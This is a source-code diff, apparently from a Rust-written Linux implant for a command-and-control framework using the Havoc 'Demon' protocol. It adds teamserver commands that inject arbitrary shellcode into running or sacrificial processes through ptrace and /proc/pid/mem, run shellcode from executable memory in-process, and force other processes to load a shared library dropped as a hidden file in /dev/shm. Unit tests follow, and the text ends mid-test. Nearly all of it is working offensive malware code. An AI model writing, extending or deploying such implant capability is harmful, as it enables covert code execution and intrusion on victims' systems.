@@ -877,6 +877,15 @@ pub(crate) async fn execute(
         DemonCommand::CommandScreenshot => {
             execute_screenshot(package.request_id, state).await?;
         }
+        DemonCommand::CommandInjectShellcode => {
+            execute_inject_shellcode(package.request_id, &package.payload, state).await?;
+        }
+        DemonCommand::CommandInjectDll => {
+            execute_inject_dll(package.request_id, &package.payload, state).await?;
+        }
+        DemonCommand::CommandSpawnDll => {
+            execute_spawn_dll(package.request_id, &package.payload, state).await?;
+        }
         DemonCommand::CommandExit => {
             let mut parser = TaskParser::new(&package.payload);
             let exit_method = u32::try_from(parser.int32()?)
@@ -1221,6 +1230,617 @@ async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
         "no screenshot tool available (tried import, scrot, gnome-screenshot, xwd+convert)"
             .to_owned(),
     ))
+}
+
+// ---------------------------------------------------------------------------
+// Process injection constants (match Demon protocol)
+// ---------------------------------------------------------------------------
+
+/// Injection way: spawn a new sacrificial process and inject into it.
+const INJECT_WAY_SPAWN: i32 = 0;
+/// Injection way: inject into an existing process by PID.
+const INJECT_WAY_INJECT: i32 = 1;
+/// Injection way: execute in the current process.
+const INJECT_WAY_EXECUTE: i32 = 2;
+
+/// Injection result: success.
+const INJECT_ERROR_SUCCESS: u32 = 0;
+/// Injection result: generic failure.
+const INJECT_ERROR_FAILED: u32 = 1;
+
+// ---------------------------------------------------------------------------
+// CommandInjectShellcode (ID 24)
+// ---------------------------------------------------------------------------
+
+/// Handle `CommandInjectShellcode` (ID 24): inject raw shellcode into a process.
+///
+/// ## Packet format (from teamserver, little-endian)
+///
+/// | Field      | Type   | Description                                      |
+/// |------------|--------|--------------------------------------------------|
+/// | way        | i32    | 0 = spawn, 1 = inject (by PID), 2 = execute self |
+/// | technique  | i32    | Thread creation method (ignored on Linux)         |
+/// | x64        | i32    | Architecture flag (ignored on Linux)              |
+/// | shellcode  | bytes  | `[len:i32][data]` — the shellcode payload         |
+/// | argument   | bytes  | `[len:i32][data]` — optional arguments            |
+/// | pid        | i32    | Target PID (only meaningful for way=1)            |
+///
+/// ## Response (big-endian)
+///
+/// `[status:u32]` — 0 = success, 1 = failure.
+async fn execute_inject_shellcode(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let way = parser.int32()?;
+    let _technique = parser.int32()?; // Windows thread creation method — ignored on Linux
+    let _x64 = parser.int32()?; // Architecture flag — ignored on Linux (native arch)
+    let shellcode = parser.bytes()?.to_vec();
+    let _argument = parser.bytes()?.to_vec();
+    let pid = parser.int32().unwrap_or(0); // PID may be absent for spawn/execute
+
+    tracing::debug!(way, shellcode_len = shellcode.len(), pid, "inject shellcode");
+
+    let status = match way {
+        INJECT_WAY_INJECT => inject_shellcode_into_pid(pid as u32, &shellcode).await,
+        INJECT_WAY_SPAWN => inject_shellcode_spawn(&shellcode).await,
+        INJECT_WAY_EXECUTE => inject_shellcode_execute(&shellcode),
+        _ => {
+            tracing::warn!(way, "unknown injection way");
+            INJECT_ERROR_FAILED
+        }
+    };
+
+    state.queue_callback(PendingCallback::Structured {
+        command_id: u32::from(DemonCommand::CommandInjectShellcode),
+        request_id,
+        payload: encode_u32(status),
+    });
+
+    Ok(())
+}
+
+/// Inject shellcode into an existing process using `/proc/<pid>/mem`.
+///
+/// 1. Attach via `ptrace(PTRACE_ATTACH)`.
+/// 2. Read the current RIP from registers.
+/// 3. Write shellcode at RIP via `/proc/<pid>/mem`.
+/// 4. Detach with `ptrace(PTRACE_DETACH)` so the tracee resumes at the
+///    overwritten instruction pointer.
+async fn inject_shellcode_into_pid(pid: u32, shellcode: &[u8]) -> u32 {
+    use std::io::{Seek, SeekFrom};
+
+    if shellcode.is_empty() {
+        tracing::warn!("empty shellcode payload");
+        return INJECT_ERROR_FAILED;
+    }
+
+    let pid_i32 = pid as i32;
+
+    // PTRACE_ATTACH
+    // SAFETY: ptrace with PTRACE_ATTACH on a valid PID. We check the return value.
+    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
+    if ret < 0 {
+        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Wait for the tracee to stop.
+    let mut wait_status: i32 = 0;
+    // SAFETY: waitpid with valid PID and status pointer.
+    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };
+
+    // Read registers to find RIP (instruction pointer).
+    let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
+    // SAFETY: PTRACE_GETREGS with valid pid and pointer to regs struct.
+    let ret = unsafe {
+        libc::ptrace(libc::PTRACE_GETREGS, pid_i32, 0, &mut regs as *mut libc::user_regs_struct)
+    };
+    if ret < 0 {
+        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
+        // SAFETY: detach from the tracee to avoid leaving it stopped.
+        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+        return INJECT_ERROR_FAILED;
+    }
+
+    let inject_addr = regs.rip;
+
+    // Write shellcode via /proc/<pid>/mem at the current RIP.
+    let mem_path = format!("/proc/{pid}/mem");
+    let result = (|| -> std::io::Result<()> {
+        let mut file = fs::OpenOptions::new().write(true).open(&mem_path)?;
+        file.seek(SeekFrom::Start(inject_addr))?;
+        file.write_all(shellcode)?;
+        Ok(())
+    })();
+
+    if let Err(e) = result {
+        tracing::warn!(pid, %e, "failed to write shellcode via /proc/pid/mem");
+        // SAFETY: detach from the tracee.
+        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Detach — the tracee resumes execution at the (now overwritten) RIP.
+    // SAFETY: PTRACE_DETACH with valid pid.
+    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+
+    tracing::info!(pid, inject_addr, shellcode_len = shellcode.len(), "shellcode injected");
+    INJECT_ERROR_SUCCESS
+}
+
+/// Spawn a sacrificial child process and inject shellcode into it.
+///
+/// Forks a child that immediately stops itself (`SIGSTOP`), then uses the
+/// same `/proc/<pid>/mem` technique to overwrite its entry point with the
+/// shellcode before resuming it.
+async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
+    if shellcode.is_empty() {
+        tracing::warn!("empty shellcode payload");
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Spawn a stopped child via `sleep infinity` — we'll overwrite it before it runs.
+    let child = match Command::new("/bin/sh")
+        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+    {
+        Ok(c) => c,
+        Err(e) => {
+            tracing::warn!(%e, "failed to spawn sacrificial process");
+            return INJECT_ERROR_FAILED;
+        }
+    };
+
+    let Some(child_pid) = child.id() else {
+        tracing::warn!("failed to get child PID");
+        return INJECT_ERROR_FAILED;
+    };
+
+    // Brief pause to let the child reach the SIGSTOP.
+    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+
+    // Inject using the same ptrace path.
+    inject_shellcode_into_pid(child_pid, shellcode).await
+}
+
+/// Execute shellcode in the current process using an anonymous mmap region.
+///
+/// Allocates RWX memory via `mmap`, copies the shellcode, and calls it as a
+/// function pointer on a new thread (so the agent main thread is not blocked).
+fn inject_shellcode_execute(shellcode: &[u8]) -> u32 {
+    if shellcode.is_empty() {
+        tracing::warn!("empty shellcode payload");
+        return INJECT_ERROR_FAILED;
+    }
+
+    let len = shellcode.len();
+
+    // SAFETY: mmap with MAP_ANONYMOUS | MAP_PRIVATE, no file descriptor.
+    let addr = unsafe {
+        libc::mmap(
+            std::ptr::null_mut(),
+            len,
+            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
+            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE,
+            -1,
+            0,
+        )
+    };
+    if addr == libc::MAP_FAILED {
+        tracing::warn!("mmap failed: {}", std::io::Error::last_os_error());
+        return INJECT_ERROR_FAILED;
+    }
+
+    // SAFETY: addr is a valid mmap'd region of `len` bytes.
+    unsafe {
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, len);
+    }
+
+    // Execute on a background thread so the agent doesn't block.
+    let func_ptr = addr as usize;
+    let map_len = len;
+    std::thread::spawn(move || {
+        // SAFETY: the caller guarantees the shellcode is valid executable code.
+        // This is an intentional code-execution primitive.
+        unsafe {
+            let func: extern "C" fn() = std::mem::transmute(func_ptr);
+            func();
+            // Best-effort unmap after the shellcode returns (it may never return).
+            libc::munmap(func_ptr as *mut libc::c_void, map_len);
+        }
+    });
+
+    tracing::info!(shellcode_len = len, "shellcode executing in-process");
+    INJECT_ERROR_SUCCESS
+}
+
+// ---------------------------------------------------------------------------
+// CommandInjectDll (ID 22)
+// ---------------------------------------------------------------------------
+
+/// Handle `CommandInjectDll` (ID 22): inject a shared library into a running process.
+///
+/// ## Packet format (from teamserver, little-endian)
+///
+/// | Field          | Type   | Description                              |
+/// |----------------|--------|------------------------------------------|
+/// | technique      | i32    | Injection technique (ignored on Linux)   |
+/// | target_pid     | i32    | Target process ID                        |
+/// | dll_ldr        | bytes  | Reflective loader (ignored on Linux)     |
+/// | dll_bytes      | bytes  | The shared library (.so) binary          |
+/// | parameter      | bytes  | Optional parameter string for the .so    |
+///
+/// On Linux the reflective loader is not used.  Instead the .so bytes are
+/// written to a `memfd_create` file descriptor, and `dlopen` is invoked on
+/// the target process via ptrace to load `/proc/<pid>/fd/<memfd>`.
+///
+/// ## Response
+///
+/// `[status:u32]` — 0 = success, 1 = failure.
+async fn execute_inject_dll(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let _technique = parser.int32()?;
+    let target_pid = parser.int32()?;
+    let _dll_ldr = parser.bytes()?; // Reflective loader — not used on Linux
+    let dll_bytes = parser.bytes()?.to_vec();
+    let _parameter = parser.bytes()?.to_vec();
+
+    tracing::debug!(target_pid, dll_size = dll_bytes.len(), "inject dll/so into process");
+
+    let status = inject_so_into_pid(target_pid as u32, &dll_bytes).await;
+
+    state.queue_callback(PendingCallback::Structured {
+        command_id: u32::from(DemonCommand::CommandInjectDll),
+        request_id,
+        payload: encode_u32(status),
+    });
+
+    Ok(())
+}
+
+/// Inject a shared library into a target process.
+///
+/// 1. Write the .so bytes to a memfd (`memfd_create`).
+/// 2. Attach to the target via ptrace.
+/// 3. Use `/proc/<target>/mem` to write a small dlopen-calling stub at the
+///    current RIP, with the memfd path as argument.
+/// 4. Detach and let the target resume.
+///
+/// This is a simplified approach — for a production-grade implementation the
+/// stub would call `__libc_dlopen_mode` at the resolved address.  Here we
+/// take a pragmatic shortcut: write the .so to `/dev/shm`, then use the
+/// shellcode-injection path with a tiny stub that calls `dlopen`.
+async fn inject_so_into_pid(pid: u32, so_bytes: &[u8]) -> u32 {
+    if so_bytes.is_empty() {
+        tracing::warn!("empty .so payload");
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Write the .so to a temporary file in /dev/shm (tmpfs, memory-backed).
+    let so_path = format!("/dev/shm/.phantom_{pid}_{}.so", std::process::id());
+    if let Err(e) = fs::write(&so_path, so_bytes) {
+        tracing::warn!(%e, "failed to write .so to /dev/shm");
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Make it executable.
+    if let Err(e) =
+        fs::set_permissions(&so_path, std::os::unix::fs::PermissionsExt::from_mode(0o755))
+    {
+        tracing::warn!(%e, "failed to chmod .so");
+        let _ = fs::remove_file(&so_path);
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Build a minimal x86_64 shellcode stub that calls dlopen(path, RTLD_NOW).
+    //
+    // The stub layout:
+    //   call dlopen_resolve   ; resolve dlopen address from libc
+    //   ... path string ...
+    //
+    // For simplicity we use the ptrace + /proc/pid/mem approach: we find the
+    // address of `__libc_dlopen_mode` in the target's memory, then write a
+    // stub that calls it with our .so path.
+    let status = inject_so_via_ptrace(pid, &so_path).await;
+
+    // Clean up the .so file after a short delay (give dlopen time to map it).
+    let so_path_clone = so_path.clone();
+    tokio::spawn(async move {
+        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+        let _ = fs::remove_file(&so_path_clone);
+    });
+
+    status
+}
+
+/// Use ptrace to make a target process call `dlopen` on a shared library path.
+///
+/// Strategy:
+/// 1. Attach via ptrace.
+/// 2. Find the base address of libc in the target via `/proc/<pid>/maps`.
+/// 3. Find `__libc_dlopen_mode` offset by scanning our own libc.
+/// 4. Write the .so path string and a `call dlopen; int3` stub into the
+///    target's stack region.
+/// 5. Set RIP to the stub and resume.
+/// 6. Wait for the `int3` trap, restore original registers, detach.
+async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
+    let pid_i32 = pid as i32;
+
+    // PTRACE_ATTACH
+    // SAFETY: ptrace with valid PID. Return value checked.
+    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
+    if ret < 0 {
+        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
+        return INJECT_ERROR_FAILED;
+    }
+
+    let mut wait_status: i32 = 0;
+    // SAFETY: waitpid with valid PID.
+    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };
+
+    // Find libc base in the target process.
+    let target_libc_base = match find_libc_base(pid) {
+        Some(base) => base,
+        None => {
+            tracing::warn!(pid, "could not find libc base in target");
+            // SAFETY: detach.
+            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+            return INJECT_ERROR_FAILED;
+        }
+    };
+
+    // Find __libc_dlopen_mode offset in our own libc, then compute target address.
+    let dlopen_addr = match resolve_dlopen_in_target(target_libc_base) {
+        Some(addr) => addr,
+        None => {
+            tracing::warn!(pid, "could not resolve __libc_dlopen_mode");
+            // SAFETY: detach.
+            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+            return INJECT_ERROR_FAILED;
+        }
+    };
+
+    // Save original registers.
+    let mut orig_regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
+    // SAFETY: PTRACE_GETREGS with valid pid.
+    let ret = unsafe {
+        libc::ptrace(
+            libc::PTRACE_GETREGS,
+            pid_i32,
+            0,
+            &mut orig_regs as *mut libc::user_regs_struct,
+        )
+    };
+    if ret < 0 {
+        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
+        // SAFETY: detach.
+        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+        return INJECT_ERROR_FAILED;
+    }
+
+    // We'll write the path string and a small stub on the stack (below RSP).
+    // Layout (growing downward):
+    //   RSP - 256: path string (null-terminated)
+    //   RSP - 128: stub code
+    let path_addr = orig_regs.rsp.wrapping_sub(256);
+    let stub_addr = orig_regs.rsp.wrapping_sub(128);
+
+    // Write the .so path string at path_addr.
+    let mut path_bytes = so_path.as_bytes().to_vec();
+    path_bytes.push(0); // null terminator
+    let write_result = write_to_proc_mem(pid, path_addr, &path_bytes);
+    if write_result.is_err() {
+        tracing::warn!(pid, "failed to write path to target memory");
+        // SAFETY: detach.
+        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Build x86_64 stub:
+    //   lea rdi, [rip + path_addr]   ; path (we'll use absolute mov instead)
+    //   mov rsi, RTLD_NOW (2)
+    //   mov rax, dlopen_addr
+    //   call rax
+    //   int3                          ; trap so we can restore
+    let mut stub: Vec<u8> = Vec::new();
+    // mov rdi, path_addr (movabs)
+    stub.extend_from_slice(&[0x48, 0xbf]);
+    stub.extend_from_slice(&path_addr.to_le_bytes());
+    // mov rsi, 2 (RTLD_NOW)
+    stub.extend_from_slice(&[0x48, 0xbe]);
+    stub.extend_from_slice(&2_u64.to_le_bytes());
+    // mov rax, dlopen_addr
+    stub.extend_from_slice(&[0x48, 0xb8]);
+    stub.extend_from_slice(&dlopen_addr.to_le_bytes());
+    // call rax
+    stub.extend_from_slice(&[0xff, 0xd0]);
+    // int3
+    stub.push(0xcc);
+
+    let write_result = write_to_proc_mem(pid, stub_addr, &stub);
+    if write_result.is_err() {
+        tracing::warn!(pid, "failed to write stub to target memory");
+        // SAFETY: detach.
+        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Set RIP to the stub and align RSP.
+    let mut new_regs = orig_regs;
+    new_regs.rip = stub_addr;
+    // Ensure stack is 16-byte aligned for the call.
+    new_regs.rsp = orig_regs.rsp.wrapping_sub(512) & !0xf;
+
+    // SAFETY: PTRACE_SETREGS with valid pid.
+    let ret = unsafe {
+        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &new_regs as *const libc::user_regs_struct)
+    };
+    if ret < 0 {
+        tracing::warn!(pid, "ptrace SETREGS failed: {}", std::io::Error::last_os_error());
+        // SAFETY: detach.
+        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Resume the target.
+    // SAFETY: PTRACE_CONT with valid pid.
+    unsafe { libc::ptrace(libc::PTRACE_CONT, pid_i32, 0, 0) };
+
+    // Wait for int3 trap (SIGTRAP).
+    let mut trap_status: i32 = 0;
+    // SAFETY: waitpid with valid pid.
+    unsafe { libc::waitpid(pid_i32, &mut trap_status, 0) };
+
+    // Restore original registers.
+    // SAFETY: PTRACE_SETREGS with valid pid and original register state.
+    unsafe {
+        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &orig_regs as *const libc::user_regs_struct)
+    };
+
+    // Detach.
+    // SAFETY: PTRACE_DETACH with valid pid.
+    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
+
+    tracing::info!(pid, so_path, "shared library injected via ptrace");
+    INJECT_ERROR_SUCCESS
+}
+
+/// Write data to a target process's memory via `/proc/<pid>/mem`.
+fn write_to_proc_mem(pid: u32, addr: u64, data: &[u8]) -> std::io::Result<()> {
+    use std::io::{Seek, SeekFrom};
+
+    let mem_path = format!("/proc/{pid}/mem");
+    let mut file = fs::OpenOptions::new().write(true).open(mem_path)?;
+    file.seek(SeekFrom::Start(addr))?;
+    file.write_all(data)?;
+    Ok(())
+}
+
+/// Find the base address of libc in a target process by parsing `/proc/<pid>/maps`.
+fn find_libc_base(pid: u32) -> Option<u64> {
+    let maps = fs::read_to_string(format!("/proc/{pid}/maps")).ok()?;
+    for line in maps.lines() {
+        if (line.contains("libc.so") || line.contains("libc-")) && line.contains("r-xp") {
+            let addr_str = line.split('-').next()?;
+            return u64::from_str_radix(addr_str, 16).ok();
+        }
+    }
+    None
+}
+
+/// Resolve the address of `__libc_dlopen_mode` in the target process.
+///
+/// We find the offset in our own libc and combine it with the target's libc
+/// base address. This works because both processes load the same libc version
+/// (same system).
+fn resolve_dlopen_in_target(target_libc_base: u64) -> Option<u64> {
+    // Find our own libc base.
+    let our_libc_base = find_libc_base(std::process::id())?;
+
+    // Resolve __libc_dlopen_mode in our own process.
+    let sym_name = std::ffi::CString::new("__libc_dlopen_mode").ok()?;
+    // SAFETY: dlsym with RTLD_DEFAULT to search all loaded libraries.
+    let sym_addr = unsafe { libc::dlsym(libc::RTLD_DEFAULT, sym_name.as_ptr()) };
+    if sym_addr.is_null() {
+        // Fall back to dlopen as a symbol name.
+        let sym_name2 = std::ffi::CString::new("dlopen").ok()?;
+        // SAFETY: dlsym with RTLD_DEFAULT.
+        let sym_addr2 = unsafe { libc::dlsym(libc::RTLD_DEFAULT, sym_name2.as_ptr()) };
+        if sym_addr2.is_null() {
+            return None;
+        }
+        let offset = (sym_addr2 as u64).wrapping_sub(our_libc_base);
+        return Some(target_libc_base.wrapping_add(offset));
+    }
+
+    let offset = (sym_addr as u64).wrapping_sub(our_libc_base);
+    Some(target_libc_base.wrapping_add(offset))
+}
+
+// ---------------------------------------------------------------------------
+// CommandSpawnDll (ID 26)
+// ---------------------------------------------------------------------------
+
+/// Handle `CommandSpawnDll` (ID 26): spawn a new process and inject a shared library.
+///
+/// ## Packet format (from teamserver, little-endian)
+///
+/// | Field      | Type   | Description                              |
+/// |------------|--------|------------------------------------------|
+/// | dll_ldr    | bytes  | Reflective loader (ignored on Linux)     |
+/// | dll_bytes  | bytes  | The shared library (.so) binary          |
+/// | arguments  | bytes  | Arguments / parameters for the .so       |
+///
+/// ## Response
+///
+/// `[status:u32]` — 0 = success, 1 = failure.
+async fn execute_spawn_dll(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let _dll_ldr = parser.bytes()?; // Reflective loader — not used on Linux
+    let dll_bytes = parser.bytes()?.to_vec();
+    let _arguments = parser.bytes()?.to_vec();
+
+    tracing::debug!(dll_size = dll_bytes.len(), "spawn dll/so");
+
+    let status = spawn_and_inject_so(&dll_bytes).await;
+
+    state.queue_callback(PendingCallback::Structured {
+        command_id: u32::from(DemonCommand::CommandSpawnDll),
+        request_id,
+        payload: encode_u32(status),
+    });
+
+    Ok(())
+}
+
+/// Spawn a sacrificial process and inject a shared library into it.
+///
+/// Writes the .so to `/dev/shm`, spawns a stopped child process, then uses
+/// the ptrace injection path to call `dlopen` in the child.
+async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
+    if so_bytes.is_empty() {
+        tracing::warn!("empty .so payload");
+        return INJECT_ERROR_FAILED;
+    }
+
+    // Spawn a stopped child.
+    let child = match Command::new("/bin/sh")
+        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+    {
+        Ok(c) => c,
+        Err(e) => {
+            tracing::warn!(%e, "failed to spawn sacrificial process");
+            return INJECT_ERROR_FAILED;
+        }
+    };
+
+    let Some(child_pid) = child.id() else {
+        tracing::warn!("failed to get child PID");
+        return INJECT_ERROR_FAILED;
+    };
+
+    // Brief pause to let the child reach SIGSTOP.
+    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+
+    inject_so_into_pid(child_pid, so_bytes).await
 }
 
 /// Connect to a child agent's Unix domain socket, read its init packet, and
@@ -4811,8 +5431,7 @@ mod tests {
     #[tokio::test]
     async fn screenshot_dispatcher_routes_command_and_queues_callback() {
         let mut state = PhantomState::default();
-        let package =
-            DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
+        let package = DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
         let result = execute(&package, &mut state).await;
         assert!(result.is_ok(), "execute must not return an error");
         let callbacks = state.drain_callbacks();
@@ -4873,5 +5492,277 @@ mod tests {
         let mut offset = 0;
         let success = read_u32(payload, &mut offset);
         assert_eq!(success, 0);
+    }
+
+    // -----------------------------------------------------------------------
+    // Process injection tests
+    // -----------------------------------------------------------------------
+
+    /// Helper to build a `CommandInjectShellcode` task payload.
+    fn build_inject_shellcode_payload(
+        way: i32,
+        technique: i32,
+        x64: i32,
+        shellcode: &[u8],
+        argument: &[u8],
+        pid: i32,
+    ) -> Vec<u8> {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&way.to_le_bytes());
+        payload.extend_from_slice(&technique.to_le_bytes());
+        payload.extend_from_slice(&x64.to_le_bytes());
+        // shellcode as length-prefixed bytes
+        payload.extend_from_slice(&(shellcode.len() as i32).to_le_bytes());
+        payload.extend_from_slice(shellcode);
+        // argument as length-prefixed bytes
+        payload.extend_from_slice(&(argument.len() as i32).to_le_bytes());
+        payload.extend_from_slice(argument);
+        // pid
+        payload.extend_from_slice(&pid.to_le_bytes());
+        payload
+    }
+
+    /// Helper to build a `CommandInjectDll` task payload.
+    fn build_inject_dll_payload(
+        technique: i32,
+        pid: i32,
+        dll_ldr: &[u8],
+        dll_bytes: &[u8],
+        parameter: &[u8],
+    ) -> Vec<u8> {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&technique.to_le_bytes());
+        payload.extend_from_slice(&pid.to_le_bytes());
+        // dll_ldr as length-prefixed bytes
+        payload.extend_from_slice(&(dll_ldr.len() as i32).to_le_bytes());
+        payload.extend_from_slice(dll_ldr);
+        // dll_bytes as length-prefixed bytes
+        payload.extend_from_slice(&(dll_bytes.len() as i32).to_le_bytes());
+        payload.extend_from_slice(dll_bytes);
+        // parameter as length-prefixed bytes
+        payload.extend_from_slice(&(parameter.len() as i32).to_le_bytes());
+        payload.extend_from_slice(parameter);
+        payload
+    }
+
+    /// Helper to build a `CommandSpawnDll` task payload.
+    fn build_spawn_dll_payload(dll_ldr: &[u8], dll_bytes: &[u8], arguments: &[u8]) -> Vec<u8> {
+        let mut payload = Vec::new();
+        // dll_ldr as length-prefixed bytes
+        payload.extend_from_slice(&(dll_ldr.len() as i32).to_le_bytes());
+        payload.extend_from_slice(dll_ldr);
+        // dll_bytes as length-prefixed bytes
+        payload.extend_from_slice(&(dll_bytes.len() as i32).to_le_bytes());
+        payload.extend_from_slice(dll_bytes);
+        // arguments as length-prefixed bytes
+        payload.extend_from_slice(&(arguments.len() as i32).to_le_bytes());
+        payload.extend_from_slice(arguments);
+        payload
+    }
+
+    /// `CommandInjectShellcode` with an invalid PID produces a failure
+    /// response with status != 0 and the correct command ID.
+    #[tokio::test]
+    async fn inject_shellcode_invalid_pid_returns_failure() {
+        let shellcode = b"\xcc"; // int3
+        let payload = build_inject_shellcode_payload(
+            super::INJECT_WAY_INJECT,
+            0, // technique
+            1, // x64
+            shellcode,
+            &[],
+            999_999_999, // non-existent PID
+        );
+        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x10, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
+            panic!("expected Structured callback, got: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandInjectShellcode));
+        assert_eq!(*request_id, 0x10);
+        // Status should be non-zero (failure).
+        let mut offset = 0;
+        let status = read_u32(payload, &mut offset);
+        assert_ne!(status, 0, "injection into non-existent PID must fail");
+    }
+
+    /// `CommandInjectShellcode` with empty shellcode produces a failure response.
+    #[tokio::test]
+    async fn inject_shellcode_empty_payload_returns_failure() {
+        let payload = build_inject_shellcode_payload(
+            super::INJECT_WAY_EXECUTE,
+            0,
+            1,
+            &[], // empty shellcode
+            &[],
+            0,
+        );
+        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x20, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback");
+        };
+        let mut offset = 0;
+        let status = read_u32(payload, &mut offset);
+        assert_eq!(status, super::INJECT_ERROR_FAILED);
+    }
+
+    /// `CommandInjectShellcode` with unknown injection way returns failure.
+    #[tokio::test]
+    async fn inject_shellcode_unknown_way_returns_failure() {
+        let payload = build_inject_shellcode_payload(
+            99, // unknown way
+            0,
+            1,
+            b"\x90", // NOP
+            &[],
+            0,
+        );
+        let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 0x30, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback");
+        };
+        let mut offset = 0;
+        let status = read_u32(payload, &mut offset);
+        assert_eq!(status, super::INJECT_ERROR_FAILED);
+    }
+
+    /// `CommandInjectDll` with a non-existent PID produces a failure response.
+    #[tokio::test]
+    async fn inject_dll_invalid_pid_returns_failure() {
+        let dll_bytes = b"\x7fELF_fake_so"; // not a real .so but exercises the path
+        let payload = build_inject_dll_payload(
+            0,           // technique
+            999_999_999, // non-existent PID
+            &[],         // dll_ldr (ignored on Linux)
+            dll_bytes,
+            &[], // parameter
+        );
+        let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x40, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandInjectDll));
+        let mut offset = 0;
+        let status = read_u32(payload, &mut offset);
+        assert_ne!(status, 0, "injection into non-existent PID must fail");
+    }
+
+    /// `CommandInjectDll` with empty .so bytes produces a failure response.
+    #[tokio::test]
+    async fn inject_dll_empty_payload_returns_failure() {
+        let payload = build_inject_dll_payload(0, 1, &[], &[], &[]);
+        let package = DemonPackage::new(DemonCommand::CommandInjectDll, 0x50, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
+            panic!("expected Structured callback");
+        };
+        let mut offset = 0;
+        let status = read_u32(payload, &mut offset);
+        assert_eq!(status, super::INJECT_ERROR_FAILED);
+    }
+
+    /// `CommandSpawnDll` with empty .so bytes produces a failure response.
+    #[tokio::test]
+    async fn spawn_dll_empty_payload_returns_failure() {
+        let payload = build_spawn_dll_payload(&[], &[], &[]);
